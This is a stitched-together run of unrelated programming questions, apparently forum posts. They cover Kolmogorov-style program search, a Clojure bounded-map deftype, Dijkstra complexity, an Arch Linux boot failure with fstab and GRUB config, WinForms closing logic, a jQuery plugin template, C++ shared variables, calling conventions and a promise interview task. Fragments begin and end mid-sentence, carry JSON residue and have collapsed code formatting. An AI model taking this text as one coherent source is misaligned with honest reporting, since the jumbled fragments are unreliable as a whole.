The answer to each question is the next binary number (using A and B). After processing the training set, the program should be able to answer questions such as the following using the algorithm it derived:BABA:?BABB:?BBBBAAA:?BAABBAAABBABA:?Constraints:The program must derive the counting algorithm only by manipulating the data given in the training set. It must not use hard coded knowledge of binary counting.Many algorithms may produce the correct answers. Therefore, the simplest algorithm is preferred. The program should assume that each answer is a transformation of the question.All questions will be in the binary format seen above, but they may be of arbitrary size.Can any existing machine learning programs/algorithms solve this? If so, how?If you believe this is unsolvable, please explain why.This update contains background to the question, explanation of the problem space, a new constraint, a proposed solution, and further questions.This problem is relevant to general machine learning where the machine must learn by observation and feedback the algorithms that govern the world around it.Based on Kolmogorov complexity, there is at least one program that can produce the correct mappings:if B, then BAif BA, then BB(etc. for all pairs in training set)This will work for every pair in the training set and nothing else. This will be the shortest program if the training set is completely random. The good news is that this is an upper bound. For any training set that is not random, there will be a smaller program that will work. Also, the number of programs smaller than upper bound is finite. A unfortunate result of Kolmogorov complexity is that it cannot be calculated. This is due to the halting problem. We can't know if any program will stop until it does.If the question is Write pi, then the program that produces the correct answer would never halt because pi has infinite digits. An answer infinitely long is never desirable so I think the best way to deal with this is to put an arbitrary limit on the length of the answer.With that additional constraint, here is an (inefficient) program that will generate a correct solution program shorter than the upper bound if one exists. (sorry of this is confusing, but these steps outline a program that generates programs that implement an algorithm to map questions to answers in a training set):Create the upper bound program. One that maps each input in the training set directly to its output.Generate every possible program that is shorter than the upper bound and list them from shortest to longest.Starting with the shortest program, run the first step of every program. Stop when a correct program is found.Eliminate programs that stop without a correct answer or produce an answer longer than the arbitrary limit.Repeat steps 3-5 running the second step, third step, etc. of the programs.This program has the following benefits:It limits the number of programs to those smaller than the upper bound program.It avoids the halting problem byincorporating an arbitrary limit to the length of the answer and executing step x in all programs before moving on to step x+1 so that the solution will be found before looping infinity.The main disadvantage is that it is terribly slow. It takes millions of years to crack a 128 bit password and I think this program could have comparable performance.Now, the questions:Do you see any significant flaws in this solution?Can this program's performance be improved in any significant waywithout introducing onerous constraints?",

Since I can't be bothered to write a proper comparator in Clojure, though, I'm going to replace each of those sets with a sorted map from a coordinate in a particular dimension to the number of data points that have that coordinate in that dimension:(def keymaps (mapv (fn [dimension]                     (->> (keys data)                          (map #(get % dimension))                          frequencies                          (into (sorted-map))))                   (range 3)))With this, it's trivial to find the bounding box of the dataset:(def bounds (mapv (juxt (comp key first) (comp key first rseq)) keymaps))ProblemNow, no matter what I do, I have to update my data and my keymaps together. Maybe, like I suggested above, I have an atom that stores some current state, and in that case that atom would look like this:(def state (atom {:data data :keymaps keymaps}))Any time I update state, I can't just use the built-in Clojure functions to update the :data because that would cause the :keymaps to become outdated. I could write my own functions to replace assoc and dissoc that would keep the two in sync, but then I wouldn't be able to make use of all the great higher-level functions (such as merge) that are built on top of the original, polymorphic assoc and dissoc.SolutionSo I decided to take the most painful approach possible: build a custom map type that allows efficient bounding box queries using the scheme detailed above. First things first, some protocols:(defprotocol Space  (dimension [this]))(defprotocol Bounded  (bounds [this]))Since I need to store extra data alongside an existing map, I can't just use extend-type on the PersistentHashMap class. No, I need a far more powerful tool: deftype! I'll have one field for the underlying data map and another for the vector of keymaps.In most cases, I could get away with just implementing the map abstraction directly, but I don't want to tie myself to a particular implementation for the wrapped map. What if later I decide that I want to use a quadtree or an octree for the underlying map, to allow for efficient queries of subspaces? To prevent myself from having to extend more protocols to my bounded map type than I need to, I'll just provide a way to get the wrapped map and query that:(defprotocol Wrapper  (wrapped [this]))And here's the deftype itself. Prepare for boilerplate:(import (clojure.lang Associative                      Counted                      ILookup                      IPersistentCollection                      IPersistentMap                      Seqable))(declare ->BoundedMap)(deftype BoundedMap [m keymaps]  Seqable  (seq [_] (seq m))  IPersistentCollection  (cons [this [k v]] (assoc this k v))  (empty [_] (->BoundedMap (empty m) (mapv empty keymaps)))  (equiv [_ x] (= m x))  ILookup  (valAt [_ k] (get m k))  (valAt [_ k not-found] (get m k not-found))  Associative  (containsKey [_ k] (contains? m k))  (entryAt [_ k] (find m k))  Counted  (count [_] (count m))  IPersistentMap  (assoc [_ k v]    (->BoundedMap (assoc m k v)                  (if (contains? m k)                    keymaps                    (mapv #(update %1 %2 (fnil inc 0)) keymaps k))))  (without [_ k]    (->BoundedMap (dissoc m k)                  (if (contains? m k)                    (mapv #(if (< 1 (get %1 %2))                             (update %1 %2 dec)                             (dissoc %1 %2))                          keymaps k)                    keymaps)))  Wrapper  (wrapped [_] m)  Space  (dimension [_] (count keymaps))  Bounded  (bounds [_]    (mapv (fn [keymap] (mapv #(key (first (% keymap))) [seq rseq])) keymaps)))And of course, what data structure would be complete without a nifty little constructor function?(defn bounded-map [dimension m]  (->> (keys m)       (iterate (partial map rest))       (take dimension)       (mapv #(into (sorted-map) (frequencies (map first %))))       (->BoundedMap m)))Now I can define my atom like this instead of what I had before:(def state (atom (bounded-map 3 data)))Pretty much all of the Clojure tools for maps will work properly, I can get bounding boxes at my leisure, and if I ever switch to a more featured map implementation for the data itself, I can always compose those extra functions with wrapped.QuestionsIs this the right approach?Is there a way to make = work properly without implementing java.util.Map (yuck)?Can this code be improved in any other way?",

Although it's simple, I question the code formatting and wonder if I'm breaking any conventions, especially if explicitly concerning the library.I also find myself concerned with what best promotes readability. Unfamiliarity brought many an alteration between styles. e.g. for statements, whether it is preferable to instantiate, modify and add an object all at once or simply pairing similar things together and modifying them wherever necessary and adding them at the end -- my final code here is an amalgamation of both styles.This last bit may be delving a bit into SO/Programmers territory, but I'm curious.

We have a Graph which is oriented. And we are going to run Dijkstra's algorithm for finding a shortest path between vertices, but it has to start only in those vertices, which has no input edge going to this vertex (the vertices with red color).So Dijkstra would be runned only from red vertices. If we run Dijkstra on all vertices, we could assume that complexity is |V|*Dijkstra but in this case we do not need such big complexity. As is one Dijkstra big, another Dijkstra from another vertex would be runned on less vertices. The more Dijkstras we run, the less vertices could be visited.Dijkstra from all vertices should have |V|(|E|+|V|*log|V|) complexity. This complexity should be much lower but I can't figure out where to compute.",

    "source": "Old HDD with arch linux on new machine won't boot <eos> I am a bit of a newbie when it comes to migrations. I had an old machine whose PSU crapped out. So I took whatever I could salvage (i.e. RAM, gfx card and the HDD which still had my arch installation) and merged it into a new machine. When I try to boot up the machine, it says cannot find root device with UUID-xxxxxx and it drops me into a recovery shell. After a bit of fiddling around I found out that the machine does boot into the fallback image and everything works perfectly. But when I reboot and try to boot into the normal image it says the same thing again. I am a bit lost as to what is going on. Could someone explain to me what went wrong and how I can go about fixing this? Also, I am writing this from the new machine in the fallback image.Cheers!Edits :/etc/fstab# UUID=2932dc14-2339-4509-aa13-4131764a9bfe/dev/sda5               /           ext4        rw,relatime,data=ordered    0 1# UUID=ed251836-86aa-40ab-bd1f-b6f40937cb72/dev/sda1               /boot       ext2        rw,relatime 0 2# UUID=c2a8e803-2197-4130-99f3-6a43cfb43e73/dev/sda7               /home       ext4        rw,relatime,data=ordered    0 2#aravind@husker:/home/aravind/Work/  /home/aravind/Work   fuse.sshfs  noauto,x-systemd.automount,_netdev,users,IdentityFile=/home/aravind/.ssh/id_rsa,allow_other,reconnect,workaround=all   0   0/var/log/dmesg.logThere is no dmesg.log or boot.log in /var/log/BootloaderGrubBootloader - config /boot/grub/grub.cfg## DO NOT EDIT THIS FILE## It is automatically generated by grub-mkconfig using templates# from /etc/grub.d and settings from /etc/default/grub#### BEGIN /etc/grub.d/00_header ###insmod part_gptinsmod part_msdosif [ -s $prefix/grubenv ]; then  load_envfiif [ ${next_entry} ] ; then   set default=${next_entry}   set next_entry=   save_env next_entry   set boot_once=trueelse   set default=0fiif [ x${feature_menuentry_id} = xy ]; then  menuentry_id_option=--idelse  menuentry_id_option=fiexport menuentry_id_optionif [ ${prev_saved_entry} ]; then  set saved_entry=${prev_saved_entry}  save_env saved_entry  set prev_saved_entry=  save_env prev_saved_entry  set boot_once=truefifunction savedefault {  if [ -z ${boot_once} ]; then    saved_entry=${chosen}    save_env saved_entry  fi}function load_video {  if [ x$feature_all_video_module = xy ]; then    insmod all_video  else    insmod efi_gop    insmod efi_uga    insmod ieee1275_fb    insmod vbe    insmod vga    insmod video_bochs    insmod video_cirrus  fi}if [ x$feature_default_font_path = xy ] ; then   font=unicodeelseinsmod part_msdosinsmod ext2set root='hd0,msdos5'if [ x$feature_platform_search_hint = xy ]; then  search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos5 --hint-efi=hd0,msdos5 --hint-baremetal=ahci0,msdos5  2932dc14-2339-4509-aa13-4131764a9bfeelse  search --no-floppy --fs-uuid --set=root 2932dc14-2339-4509-aa13-4131764a9bfefi    font=/usr/share/grub/unicode.pf2fiif loadfont $font ; then  set gfxmode=auto  load_video  insmod gfxtermfiterminal_input consoleterminal_output gfxtermset timeout=5### END /etc/grub.d/00_header ###### BEGIN /etc/grub.d/10_linux ###menuentry 'Arch Linux, with Linux core repo kernel' --class arch --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-core repo kernel-true-2932dc14-2339-4509-aa13-4131764a9bfe' {    load_video    set gfxpayload=keep    insmod gzio    insmod part_msdos    insmod ext2    set root='hd0,msdos1'    if [ x$feature_platform_search_hint = xy ]; then      search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  ed251836-86aa-40ab-bd1f-b6f40937cb72    else      search --no-floppy --fs-uuid --set=root ed251836-86aa-40ab-bd1f-b6f40937cb72    fi    echo    'Loading Linux core repo kernel ...'    linux   /vmlinuz-linux root=UUID=2932dc14-2339-4509-aa13-4131764a9bfe ro  quiet    echo    'Loading initial ramdisk ...'    initrd  /initramfs-linux.img}menuentry 'Arch Linux, with Linux core repo kernel (Fallback initramfs)' --class arch --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-core repo kernel-fallback-2932dc14-2339-4509-aa13-4131764a9bfe' {    load_video    set gfxpayload=keep    insmod gzio    insmod part_msdos    insmod ext2    set root='hd0,msdos1'    if [ x$feature_platform_search_hint = xy ]; then      search --no-floppy --fs-uuid --set=root --hint-bios=hd0,msdos1 --hint-efi=hd0,msdos1 --hint-baremetal=ahci0,msdos1  ed251836-86aa-40ab-bd1f-b6f40937cb72    else      search --no-floppy --fs-uuid --set=root ed251836-86aa-40ab-bd1f-b6f40937cb72    fi    echo    'Loading Linux core repo kernel ...'    linux   /vmlinuz-linux root=UUID=2932dc14-2339-4509-aa13-4131764a9bfe ro  quiet    echo    'Loading initial ramdisk ...'    initrd  /initramfs-linux-fallback.img}### END /etc/grub.d/10_linux ###### BEGIN /etc/grub.d/20_linux_xen ###### END /etc/grub.d/20_linux_xen ###### BEGIN /etc/grub.d/30_os-prober ###### END /etc/grub.d/30_os-prober ###### BEGIN /etc/grub.d/40_custom #### This file provides an easy way to add custom menu entries.

    "source": "Supporting all closure options in WinForms MVC application <eos> I have a WinForms MVC application that uses Ninject for it's Dependency Injection (DI) / IoC Container. I have build quite a nice framework that allows the main shell (which uses a Docking Container to house an manipulate windows - like Visual Studio), to manipulate IDocument types (actual documents .txt, .xlsx etc.) and ITool types (my utilities, like file system explorer tree view, Command Window etc.). I communicate from the views (which are blind and deaf to the fact the controllers exist) to their controllers via event handlers. So the architecture is like this: IView.cs:public interface IView{    string DisplayName { get; set; }}IController.cs:public interface IController{    bool IsDirty { get; set; }    IView View { get; }}IDocumentView.cs:public interface IDocumentView : IView, IActivate, IDeactivate{    bool StatusBarVisible { get; set; }}IDocumentController.cs:public interface IDocumentController : IController{    bool Handles(string path);    DocumentView New(string fileName);    DocumentView Open(string path);    void Save();    string FilePath { get; set; }    IEnumerable<DocumentFileType> FileTypes { get; }}I then have an abstract DocumentView class that handles so common behaviors of all IDocument types.DocumentController.cs:public abstract class DocumentController : IDocumentController, IClose, IGuardClose, IDisposable{       // Lots of stuff...}IGuardClose.cs:public interface IGuardClose{    void CanClose(Action<bool> callback);}IClose.cs:public interface IClose{    bool TryClose(object sender, FormClosingEventArgs e);}DocumentView.cs:    [TypeDescriptionProvider(typeof(AbstractControlDescriptionProvider))]    public abstract class DocumentView : DockContent, IDocumentView, IViewManagment    {        public virtual EventHandler OnViewLoaded { get; set; }        public virtual EventHandler OnViewClosing { get; set; }    public virtual EventHandler<EventArgs> ViewActivated { get; set; }    public virtual EventHandler<EventArgs> ViewDeactivate { get; set; }    public abstract string DisplayName { get; set; }    public virtual bool StatusBarVisible { get; set; }}IViewManagement.cs:public interface IViewManagment{    EventHandler OnViewLoaded { get; set; }    EventHandler<FormClosingEventArgs> OnViewClosing { get; set; }}They allow me to wire my controller up to listen for the loaded and losing events triggered from the view without the view knowing anything about it, but herein lies my problem.For my actual IDocumentViews and IDocumentControllers, I inherit from DocumentView and DocumentController respectively. This works well and all is fine, I can open new documents, open from files system you name it. My issue, is to do with closure. If I click the views X button to close the view, I need (and do) let the controller clean up some resources it is using (a FileSystemWatcher for the opened file etc.), but I also need to be able to close the view from the controller, so the TryClose method cannot merely do View.Close() for all calls as clearly this will envolve a stack overflow, as the View.Close() request would lead to another call to the controller TryClose etc. My questions:How can I best implement Controller.TryClose() so it can be used from both the controller and the view, should I have two methods in IClose, CleanUp(), let the controller clean its business and Close() actually close the view as well as clean up?Sometimes the user will close the main shell. Here I can to loop through all open documents and check CanClose() of IGuardClose. Assuming I can easily access the controllers from the main shell in a for loop/foreach loop, how best could I implement a close all (with safety - some documents  are unsaved do you want to save now?)?",

I\\'m a warning!');            settings.onAfterInit.call(this);            return this; // Is this needed for chaining?        },        // Example call:        // console.log($.funkyTown('foo_public_method', 'Wha?'));        foo_public_method : function(arg1) {            arg1 = (typeof arg1 !== 'undefined') ? arg1 : 'Boo!';            return 'foo_public_method(), arg1: ' + arg1;        },        // Might need to give users the option to destroy what this plugin created:        destroy : function() {            // Undo things here.        }    },    // The _ (underscore) is a naming convention for private members.    _foo_private_method = function() {        return '_foo_private_method(), settings.foo: ' + settings.foo;    };    // Method calling logic/boilerplate:    $.funkyTown = function(method) {        if (methods[method]) {            return methods[method].apply(this, Array.prototype.slice.call(arguments, 1));        } else if ((typeof method === 'object') || ( ! method)) {            return methods.init.apply(this, arguments);        } else {            $.error('Method ' + method + ' does not exist on jQuery.funkyTown.');        }    };}(jQuery, window, document));The above is called like so:$(document).ready(function() {    // Calls init and modifies default options:    $.funkyTown({ foo : 'baz' });    // Access to public method:    console.log($.funkyTown('foo_public_method', 'Wha?'));});My questions:Do you see anything out of the ordinary with my above plugin template? If so, how could it be improved?Related to #1 above: As you can probably see, I'm trying to account for the various needs like passing options, private and public methods and console handling... What am I missing in terms of useful features? This line $.funkyTown = function(method) { makes the javascript linter throw a warning: warning: anonymous function does not always return a value; is there anyway for me to fix this? Could I just add return false to the end (right before the closing };? Update: Looks like I just needed to use a different tool.Because I'm writing a utility plugin (one that will never be used directly on an element) do I still need to return this in my public methods in order to make things chainable (see the return this; // Is this needed for chaining? line of code above)? Should I even worry about chaining for this type of plugin?Could you provide any other feedback to help me improve my code?What's the easiest/best way to pass settings from init to other private and public functions? Normally, I'd use .data() on $(this) to store settings and other stateful vars... Because there's not element, should I just pass settings as an argument to the other methods? Update: Doi! This was an easy one! I simply needed to initialize my settings outside of my public methods object.UPDATE 1:I've updated my code (above) to reflect the things I've learned (i.e. the strike-through lines in numeric list above) since posting this question.I've also added a new feature:;(function($, window, document, undefined) {// ...}(jQuery, window, document));I found that I needed access to window a few times already in my real script... After some Googling, I found this awesome resource:JavaScript Patterns Collection... which led me to here:Lightweight - perfect as a generic template for beginners and above... specifically:// the semi-colon before the function invocation is a safety// net against concatenated scripts and/or other plugins// that are not closed properly.;(function ( $, window, document, undefined ) {    // undefined is used here as the undefined global    // variable in ECMAScript 3 and is mutable (i.e. it can    // be changed by someone else). undefined isn't really    // being passed in so we can ensure that its value is    // truly undefined. In ES5, undefined can no longer be    // modified.    // window and document are passed through as local    // variables rather than as globals, because this (slightly)    // quickens the resolution process and can be more    // efficiently minified (especially when both are    // regularly referenced in your plugin).})( jQuery, window, document );Update 2:I've added callbacks. I've also decided to use $.noop in place of function() {}:... typing $.noop is 6 chars shorter than function(){}. Also if you  use this everywhere instead of creating new, anonymous, empty  functions, you'll slightly cut down on memory.  MarcoNow I'm wondering what my callbacks should return in a utility plugin? Sending this doesn't seem that useful.",

So I start by:If $n=3$, then we have a triangle and there is only one tour.Assume that there are $(n-1)!/2$ distinct tours for a ETSP on $n$ points. Prove that there are $n!/2$ distinct tours for a ETSP on $n+1$ points?Here I proceed like this: for each tour $t$ from the $(n-1)!/2$ distinct tours do: add one point $n+1$.for each edge $e=\\{v_i, v_j\\}$ in $t$ do: remove $e$ and create two edges $e_1=\\{n+1,v_i\\}$ and $e_2=\\{n+1, v_j\\}$.

However, is this also the case for simple hyperbolic case (i.e. where $A$ and $C$ are zero, leading to form: $Bxy + Dx + Ey + F = 0$)? Alpertron (https://www.alpertron.com.ar/METHODS.HTM) shows a method for such a case which involves finding all integer divisors of $DE-BF$ - a task which can be tricky for large coefficients. For certain, sufficiently large coefficients Alpertron's method would imply that this can be computed in sub-exponential time (using GNFS).Is there any algorithm to be used for SHCDE which would find the solutions in less than exponential time (unlike standard ones for general BQDE)?",

These need to be accessed and modified from 3 threads. What is an appropriate design pattern to facilitate thread-safe read-write access to each of these 140 variables without locking all of them under a single mutex (which I expect will result in bad performance)?Some details about the performance requirements:Thread 1 (CAN Serial Communication) receives packets from hardware sensors every 1ms that contain the updated value for one of the 70 input shared variables; the thread updates the variable with that value. Also, every 5ms Thread 1 needs to make a copy of all the 70 output variables.Thread 2 (Controller) creates a copy of all input variables every 10ms, as well as overwrites all the output variables.Thread 3 (GUI) makes a copy of all input and output variables every 500ms.The system runs on an ARM Cortex-A8 600Mhz.One solution is to create a mutex lock for each of the 140 variables, but this feels like a hack. I would then wrap the variables in a class with 140 getters and setters, which also seems ugly.A side-note about std::atomic:The other alternative is std::atomic. But I feel it is an advanced and complicated feature, for example I was told on IRC that the following example snippet is not thread-safe, despite looking intuitively like it should be:typedef struct MyStruct {        std::atomic<int> a;        std::atomic<int> b;}std::atomic<MyStruct> atomic_struct;atomic_struct.a = 1;atomic_struct.b = 2;// Make a copy of `atomic_struct`Mystruct normal_struct;normal_struct = atomic_struct;// Edit the values of the copied struct and copy the changes back to the `atomic_struct`.normal_struct.a = 100;normal_struct.b = 200;atomic_struct = normal_struct;",

Finally, an adversary is allowed, for each i∈A separately, to flip ri if it wants to.My question is this: can the resulting string (call it r') be used by an RP or BPP algorithm as its only source of randomness?  Assume that the adversary knows in advance the entire BPP algorithm, the string r, and the set A, and that it has unlimited computation time.

I mean why not have the function stdcallFunction be saved in the object file simply as stdcallFunction and not as _stdcallFunction@4?I think the reason is the following:Say I created a library (a .lib library and not a .c library) that contains the above two functions.Now I want to call the function stdcallFunction in this library from my `C source file, I would do the following:void __stdcall stdcallFunction(int i);stdcallFunction(123);This will compile fine. But if I did the following (changed the calling convention for the function declaration):void __cdecl stdcallFunction(int i);stdcallFunction(123);Then this will produce a compilation error.So the reason for using name decoration is for the compiler to make sure that I am using the correct calling convention when calling a function that exists in a library (the name decoration is simply an indication of what is the calling convention of a function in a library).Am I correct?",

Currently in my career I am employed as a Product Specialist supporting a content management system at <a href=http://www.vertafore.com/>Vertafore</a>, an insurance              software company. I have life long aspirations to become a software developer. I currently use <strong>HTML5</strong>, <strong>CSS3</strong>, <strong>JavaScript</strong> and other JS frameworks like <strong>Bootstrap</strong>, <strong>JQuery</strong>,              <strong>AngularJS</strong>, <strong>ExpressJS</strong>, and <strong>NodeJS</strong>. I also have experience with <strong>MongoDB</strong>, and <strong>T-SQL</strong>. What interests me the most about the JavaScript language is that it allows              you to develop front and back-end applications all using one language. I find the MEAN stack, as they call it, practical due to the fact that you are not flipping between different languages. Not to mention its leverage of HTTP for scalability,              availability, and versatility. What I mean by this is that you can develop robust applications with next to no footprint, readily available wherever there is an internet connection and a web browser. To me, something about that seems powerful.            </p>          </div>        </div>        <div class=row>          <div class=container well portfolio id=3>            <h2 class= text-center title-text>Portfolio</h2>            <div class=row>              <div class=col-md-4>                <a href=http://codepen.io/brandon-gottschling/full/XmLvmo/ class=thumbnail target=_blank>                  <img src=http://i1382.photobucket.com/albums/ah271/Brandon_Gottschling/thumbnail1_zpsdbbhlko6.png alt= class=img-thumbnail>                  <div class=caption>                    <p>Quote-O-Matic</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #2</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #3</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #4</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Project #5</p>                  </div>                </a>              </div>              <div class=col-md-4>                <a href=# class=thumbnail>                  <img src=http://i1382.photobucket.com/albums/ah249/alyssa_marie21/iph_zpsrzdkhjpj.jpg alt= class=img-thumbnail>                  <div class=caption>                    <p>Porject #6</p>                  </div>                </a>              </div>            </div>          </div>          <div class=row>            <div class=container well contact id=4>             <div class= title-text text-center>               <h2>Contact Me</h2>              <h4>Let My Passion Be Your Product</h4>             </div>            <div class=row social_buttons>              <div class=col-sm-offset-1 col-md-2 text-center linkedin>                <a href=https://www.linkedin.com/in/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-linkedin></i> LinkedIn</a>              </div>              <div class=col-md-2 text-center>                <a href=https://github.com/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-github></i> Github</a>              </div>              <div class=col-md-3 text-center>                <a href=http://www.freecodecamp.com/bgottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-fire></i> freeCodeCamp</a>              </div>              <div class=col-md-2 text-ceneter>                <a href=http://codepen.io/brandon-gottschling class=btn btn-default btn-lg center-block role=button target=_blank><i class=fa fa-codepen></i> Codepen</a>              </div>            </div>          </div>        </div>        <div class=footer>          <div class=container>            <p class=>Copyright  Brandon Gottschling 2015.

After a couple of warm-up challenges I was presented with this:Please write a function that calls back with true if all  promises have resolved successfully, or false if at least one  promise has rejected.Given 'Promise' API:promise.then(  function resolve() { /* called when some async thing was successful */},  function reject() { /* the async thing failed */ });and also was given the following function structure and mocking code:function all (promises, callback) {    // TODO call back with `true` if all promises resolve(), or `false` if a promise has reject()ed    promises.forEach(function (promise) {        promise.then(          function resolve() {},          function reject() {}        );    });}// Some mocking code (NO NEED TO READ THIS):function P() { return { then: function (resolve, reject) {  setTimeout(function() { (5*Math.random()|0) ? resolve() : reject() }, Math.random()*1000);}}}var promises = [1,2,3,4,5].map(P);all(promises, function (success) {  console.log('The promises have ' + ( success ? '' : 'not ' ) + 'all resolved!' )});The gist of it: I had to write an almost Promise.all() method that would check if all async functions finished and how they finished (resolve/reject).I didn't finish the challenge in the allocated time frame, so I failed (and years later, looking at the code I've written to finally solve it, if was the interviewer, I would failed me even if I was done in time...)My current implementationA few days ago I found the challenged buried on the hard drive and decided to give it a go (I timed myself to finish it in time):Does not re-include the mocking code from above, but it is included in the jsbin belowfunction all (promises, callback) {    const promisesStatus = [];    const allPromisesChecked = (promisesArray = promises, promisesStatusArray = promisesStatus) => promisesStatusArray.length === promisesArray.length;    const allPromisesPassed = (promisesArray = promisesStatus) => {        if (promisesArray.filter(value => !value).length === 0) { return true; }        return false;    };    promises.forEach(function (promise) {        promise.then(          function resolve() {              promisesStatus.push(true);              if (allPromisesChecked() && allPromisesPassed()) { callback(true); }          },          function reject() {              promisesStatus.push(false);              if (allPromisesChecked() && !allPromisesPassed()) { callback(false); }          }        );    });};JSBin: https://jsbin.com/dajini/edit?js,consoleQuestionsKeeping in mind that this is to be done under the clock and under the interviewer's eyes (pair programming), hence under stress...Implementation - Leaving aside minor performance optimizations, could I have done it better?

    "source": "Strategy Pattern not sufficient for my problem? <eos> Let me sketch the situation:I have multiple users, with certain properties (2 enums)For each user I need to fetch data, for some with some basic filtering, for some extended filtering (= basic filtering + extra filtering). I'd like to do that not separate for every user, but I'd rather group the users and do it in two queries.For every user, I need to filter that data depending on the values of the enums. I will always need to do GetFirstData() (method depending on first enum), GetLastData() (method depending on second enum), CheckData() (depending on both enums). I've been looking at the Strategy Pattern, but it seems that's more designed to implement one behavior. I want to combine my behaviors to avoid making the combinations between all GetFirstData and GetLastData, is there any pattern to do this better? I've been thinking on just using 2 delegates and assign the corresponding methods depending on the values of the enums. Would this be the cleanest way?Little example of what I mean:public class User{   public Enum1 FirstEnum {get; set;}   public Enum2 SecondEnum {get; set;}   ...}public IEnumerable<Data> Filter(int userId, Expression extraFilter){    var data = GetData(userId);    if(extraFilter != null)      data = data.Where(extraFilter);    return data;}public Data GetFirstData(IEnumerable<Data> data);public Data GetLastData(IEnumerable<Data> data);public bool CheckData(IEnumerable<Data> data);My endresult could do something like this:public class EndResult{    public Data FirstResult {get; set;}    public Data SecondResult {get; set;}    public Func<IEnumerable<Data>,Data> GetFirstData {get; set;}    public Func<IEnumerable<Data>,Data> GetLastData {get; set;}    public bool ExtendeFiltering {get; set;}    public EndResult(User user)    {        switch(user.enum1)        {            case: GetFirstData = specificFunction;                  ExtendedFiltering = true;            ...        }        //Second for GetLastData;    }    public void Execute()    {        GetData();        CheckData();        GetFirstData();        GetLastData();    }}Edit: For future readers who are curious, I didn't use delegates (not directly at least). I created 2 interface IFirst and ILast with a corresponding method. In my static create method defined on my processor class, I do the logic to create an instance of those interfaces based on certain conditions. The reason I left the path of directly using delegates is because it turned out I needed more parameters than just User for some of them. So I resorted to different implementations based on the parameters I need in the constructor of those classes.",

The reward in the orginal game is the value of the merged cells. For example, if two fours merged than the reward is eight. My reward function is almost the same, except I take the log2 of it.I tried these parameteres and I also tweaked the learning rate, the gamma, but I couldn't achive any good result.  Could You recommend what should I change?",

RIA Services vs CSLA <eos> Another 2 days of reading and watching demos and here we go.For my enterprise LoB Silverlight app I'm going to use:Prism for UI aspects and modularity.MVVM pattern (using Prism)??? to bring data over and validations...Entity Framework for Data accessSQL Server for dataOk, main dilemma is #3. If I won't use any framework then I will have to figure out how to do all CRUD stuff myself. I can do RESTful WCF, I can do SOAP. All that == MANUAL coding.I can do RIA Services. I kind of see what it does and it is nice for direct match with my data layer BUT it is not that great if there will be lot of business logic. Where would I put it? In my ViewModel? Another question is how those services maintained. Once I generated it - I should maintain them by hand if data changes?I also found CSLA which seems to be nice on one hand but receives lot's of critique.. CSLA will allow me to write business logic and shape object as I needed and than I can pass it through ViewModel and all is well.Something tells me that RIA Services will be much quicker to write. Also, I like the fact that I don't have to include extra dependencies.There is no blogs or mentioning of RIA Services since 2010. Is it going under table? Not widely accepted? Not scaling well for big apps? I'm trying to decide which one I need to bet on. CSLA or RIA Services. OR?",

Does Artifactory support having multiple versions of each of these artifacts to represent the different builds that were performed during a release to construct this artifact? For example, to produce the final version of the 5.2 release of mylibrary aka the artifact: mylibrary-5.2.jar, we went through 3 builds to get to a version that passed our integration environment's automated tests and our user acceptance tests. So there were three separate builds that produced three separate artifacts for release 5.2. We want to be able to retain and potentially recall these different build's artifact at a later date (for testing, etc).In order to do this, which of the following options would work?Capture the artifacts as separate Artifacts, i.e.build-5.2-b1.jar (build 1's artifact), build-5.2-b2.jar (build 2'sartifact), build-5.2-b3.jar (build 3's artifact), and build-5.2.jar(the final production release; which matches build 3)Capture a SINGLE artifact named build-5.2.jar which hasVERSIONS of the artifact which capture builds 1 through 3 and whichcan be recalled later, by version number.

The current project I'm working on is writing an assembler using a high level language of my choice, to translate from Hack assembly code to Hack machine code (Hack is the name of the hardware platform built in the previous chapters).  Although the hardware has all been built in a simulator, I have tried to pretend that I am really constructing each level using only the tools available to me at that point in the real process.That said, it got me thinking.  Using a high level language to write my assembler is certainly convenient, but for the very first assembler ever written (i.e. in history), wouldn't it need to be written in machine code, since that's all that existed at the time?And a correlated question... how about today?  If a brand new CPU architecture comes out, with a brand new instruction set, and a brand new assembly syntax, how would the assembler be constructed?  I'm assuming you could still use an existing high level language to generate binaries for the assembler program, since if you know the syntax of both the assembly and machine languages for your new platform, then the task of writing the assembler is really just a text analysis task and is not inherently related to that platform (i.e. needing to be written in that platform's machine language)... which is the very reason I am able to cheat while writing my Hack assembler in 2012, and use some preexisting high level language to help me out.",

    "source": "Legitimate real work in a constructor? <eos> I am working on a design, but keep hitting a roadblock. I have a particular class (ModelDef) that is essentially the owner of a complex node tree built by parsing an XML schema (think DOM). I want to follow good design principles (SOLID), and ensure that the resulting system is easily testable. I have every intention of using DI to pass dependencies into the constructor of ModelDef  (so that these can easily be swapped out, if need be, during testing).What I'm struggling with, though, is the creation of the node tree. This tree is going to be made up entirely of simple value objects which will not need to be independently tested. (However, I may still pass an Abstract Factory into ModelDef to assist with the creation of these objects.) But I keep reading that a constructor should not do any real work (e.g. Flaw: Constructor does Real Work). This makes perfect sense to me if real work means constructing heavy-weigh dependent objects that one might later want to stub out for testing. (Those should be passed in via DI.) But what about light-weight value objects such as this node tree? The tree has to be created somewhere, right? Why not via the constructor of ModelDef (using, say, a buildNodeTree() method)?I don't really want to create the node tree outside of ModelDef and then pass it in (via constructor DI), because creating the 